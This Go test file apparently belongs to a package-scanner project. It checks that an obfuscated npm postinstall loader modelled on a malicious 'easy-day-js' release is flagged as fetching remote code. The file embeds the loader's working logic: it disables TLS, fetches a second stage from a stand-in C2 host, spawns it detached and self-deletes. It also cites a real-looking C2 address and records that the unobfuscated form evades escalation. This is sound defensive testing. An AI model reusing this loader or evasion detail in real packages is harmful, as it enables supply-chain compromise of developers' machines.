package intelligence

import (
	"testing"

	"github.com/chain305/chainsaw-core/installscripts"
)

// Mastra npm org (row 44). The byte half of the default-seed refusal (the
// package-age half is core/policy/attack2026_44_test.go): easy-day-js@1.11.22
// runs "postinstall": "node setup.cjs --no-warnings"; setup.cjs (4,572 B)
// is string-array obfuscated (rotated array, custom base64 decoder, seed
// 0x4c11d), disables TLS checks, fetches a second stage from
// https://23.254.164.92:8000/update/49890878, writes it to a random .js and
// spawns it detached (Microsoft, 2026-06-17).
//
// The referenced-script follower resolves setup.cjs and ScanReferencedBody
// escalates it to fetches_remote — ONLY because of the obfuscator's _0x
// identifiers: fetch + spawn of a written file is the benign
// binary-installer shape and is deliberately not escalated. The readable
// twin below pins that dependency.
func TestAttack2026_44_Mastra_ByteScan(t *testing.T) {
	logic := "process.env.NODE_TLS_REJECT_UNAUTHORIZED='0';\n" +
		"const os=require('node:os'),fs=require('fs'),{spawn}=require('node:child_process');\n" +
		"fs.writeFileSync(os.tmpdir()+'/.pkg_history',String(Date.now()));\n" +
		"fetch('https://c2.example.invalid:8000/update/49890878').then(r=>r.text()).then(src=>{" +
		"const f=os.tmpdir()+'/'+Math.random().toString(36).slice(2)+'.js';fs.writeFileSync(f,src);" +
		"spawn(process.execPath,[f],{detached:true,stdio:'ignore'}).unref();fs.rmSync(__filename);});\n"
	manifest := `{"name":"easy-day-js","version":"1.11.22","main":"index.js",` +
		`"scripts":{"postinstall":"node setup.cjs --no-warnings"}}`

	p := newInstallScriptsProvider()
	got := atkBRun(t, p, "easy-day-js", "1.11.22", atkBTarball(t, map[string]string{
		"package.json": manifest,
		"index.js":     "module.exports=require('./dayjs.min.js');\n",
		"setup.cjs":    atkBObfuscatedJS(logic),
	}))
	if !got.HasInstallScript || !got.InstallScriptFetches || got.InstallScriptKind != string(installscripts.KindFetchesRemote) {
		t.Fatalf("obfuscated setup.cjs: want fetches_remote (seed block rule input), got %+v", got)
	}

	// The same logic, unobfuscated: present, not escalated.
	plain := atkBRun(t, p, "easy-day-js", "1.11.22", atkBTarball(t, map[string]string{
		"package.json": manifest, "setup.cjs": logic,
	}))
	if plain.InstallScriptFetches {
		t.Fatalf("readable fetch+spawn loader escalated — the documented FP trade-off changed: %+v", plain)
	}

	// Negative control: a native-addon style postinstall that downloads a
	// platform binary and runs it.
	benign := atkBRun(t, p, "some-native", "2.0.0", atkBTarball(t, map[string]string{
		"package.json": `{"name":"some-native","version":"2.0.0","scripts":{"postinstall":"node install.js"}}`,
		"install.js": "const https=require('https'),fs=require('fs'),{execFileSync}=require('child_process');\n" +
			"https.get('https://github.com/x/y/releases/download/v2/bin-'+process.platform,r=>r.pipe(fs.createWriteStream('bin')).on('finish',()=>{fs.chmodSync('bin',0o755);execFileSync('./bin',['--version']);}));\n",
	}))
	if benign.InstallScriptFetches {
		t.Fatalf("benign binary installer escalated: %+v", benign)
	}
}
